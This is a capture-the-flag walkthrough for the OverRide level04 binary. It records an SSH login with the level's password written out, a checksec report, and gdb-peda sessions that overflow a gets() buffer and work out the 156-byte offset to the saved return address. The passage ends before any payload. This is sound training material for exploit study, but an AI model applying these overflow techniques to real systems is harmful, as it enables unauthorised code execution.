```shell
┌──$ [~/42/2022/override]
└─>  ssh 192.168.56.101 -p 4242 -l level04
           ____                  ____  _     __
          / __ \_   _____  _____/ __ \(_)___/ /__
         / / / / | / / _ \/ ___/ /_/ / / __  / _ \
        / /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
        \____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 192.168.56.101:4242
level04@192.168.56.101's password: kgv3tkEb9h2mLkRsPkXRfc2mHbjMxQzvb2FrgKkf

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```
Program creates a new (child) process in which it gets user input and store it in local array.

`/usr/include/linux/prctl.h` contains defined values for `prctl()`
`/usr/include/linux/ptrace.h` contains defined values for `ptrace()`


Run the executable in background mode
```shell
level04@OverRide:~$ ./level04
Give me some shellcode, k
^Z
[1]+  Stopped                 ./level04
```
Display information about processes and print lines matching `level04` to retrieve PID of child and kill it.
```shell
level04@OverRide:~$ ps afux | grep "./level04"
level04  12600  0.0  0.0   9596   660 pts/0    S+   08:19   0:00  |           \_ grep --color=auto ./level04
level05  12597  0.0  0.0   1992   280 pts/1    T    08:19   0:00              \_ ./level04
level05  12598  0.0  0.0   2000    56 pts/1    t    08:19   0:00                  \_ ./level04
level04@OverRide:~$ kill -9 12598
level04@OverRide:~$ fg
./level04
child is exiting...
```
Program uses unsecure function `gets()` which enables malicious users to arbitrarily change a running program's functionality through a buffer overflow attack.
```gdb
level04@OverRide:~$ gdb ./level04
gdb-peda$ run <<< $(python -c "print 'A'*1000")
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x41414141 ('AAAA')
ECX: 0xf7fd08c4 --> 0x0
EDX: 0xffffd620 ('A' <repeats 200 times>...)
ESI: 0x0
EDI: 0x41414141 ('AAAA')
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd6c0 ('A' <repeats 200 times>...)
EIP: 0x41414141 ('AAAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xffffd6c0 ('A' <repeats 200 times>...)
0004| 0xffffd6c4 ('A' <repeats 200 times>...)
0008| 0xffffd6c8 ('A' <repeats 200 times>...)
0012| 0xffffd6cc ('A' <repeats 200 times>...)
0016| 0xffffd6d0 ('A' <repeats 200 times>...)
0020| 0xffffd6d4 ('A' <repeats 200 times>...)
0024| 0xffffd6d8 ('A' <repeats 200 times>...)
0028| 0xffffd6dc ('A' <repeats 200 times>...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
```

To find rigth offset, break on call of gets to get address of local array and saved EIP.
```gdb
level04@OverRide:~$ gdb ./level04
gdb-peda$ break *main+150
Breakpoint 1 at 0x804875e
gdb-peda$ run
[----------------------------------registers-----------------------------------]
EAX: 0xffffd620 --> 0x0
EBX: 0xffffd620 --> 0x0
ECX: 0xffffffff
EDX: 0xf7fd08b8 --> 0x0
ESI: 0x0
EDI: 0xffffd6a0 --> 0xf7feb620 (push   ebp)
EBP: 0xffffd6b8 --> 0x0
ESP: 0xffffd600 --> 0xffffd620 --> 0x0
EIP: 0x804875e (<main+150>:     call   0x80484b0 <gets@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048752 <main+138>:        call   0x8048500 <puts@plt>
   0x8048757 <main+143>:        lea    eax,[esp+0x20]
   0x804875b <main+147>:        mov    DWORD PTR [esp],eax
=> 0x804875e <main+150>:        call   0x80484b0 <gets@plt>
   0x8048763 <main+155>:        jmp    0x804881a <main+338>
   0x8048768 <main+160>:        nop
   0x8048769 <main+161>:        lea    eax,[esp+0x1c]
   0x804876d <main+165>:        mov    DWORD PTR [esp],eax
Guessed arguments:
arg[0]: 0xffffd620 --> 0x0
[------------------------------------stack-------------------------------------]
0000| 0xffffd600 --> 0xffffd620 --> 0x0
0004| 0xffffd604 --> 0x0
0008| 0xffffd608 --> 0x0
0012| 0xffffd60c --> 0x0
0016| 0xffffd610 --> 0xb80
0020| 0xffffd614 --> 0x0
0024| 0xffffd618 --> 0xf7fdc714 --> 0x20e28
0028| 0xffffd61c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x0804875e in main ()
gdb-peda$ info frame
Stack level 0, frame at 0xffffd6c0:
 eip = 0x804875e in main; saved eip 0xf7e45513
 called by frame at 0xffffd730
 Arglist at 0xffffd6b8, args:
 Locals at 0xffffd6b8, Previous frame's sp is 0xffffd6c0
 Saved registers:
  ebx at 0xffffd6b0, ebp at 0xffffd6b8, edi at 0xffffd6b4, eip at 0xffffd6bc
gdb-peda$ p/d 0xffffd6bc-0xffffd620
$1 = 156
```
